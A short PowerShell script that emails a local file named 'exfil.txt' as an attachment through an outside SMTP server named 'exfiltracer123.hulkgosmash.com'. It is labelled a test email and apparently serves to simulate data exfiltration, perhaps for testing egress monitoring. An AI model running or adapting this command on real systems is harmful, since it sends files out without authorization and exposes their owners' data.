$SMTPServer = "exfiltracer123.hulkgosmash.com"
$SMTPFrom = "test@example.com"
$SMTPTo = "root@localhost"
$MessageSubject = "Test Email"
$MessageBody = "This is a test email sent from PowerShell."
Send-MailMessage -SmtpServer $SMTPServer `
                 -From $SMTPFrom `
                 -To $SMTPTo `
                 -Subject $MessageSubject `
                 -Body $MessageBody `
                 -Attachments .\exfil.txt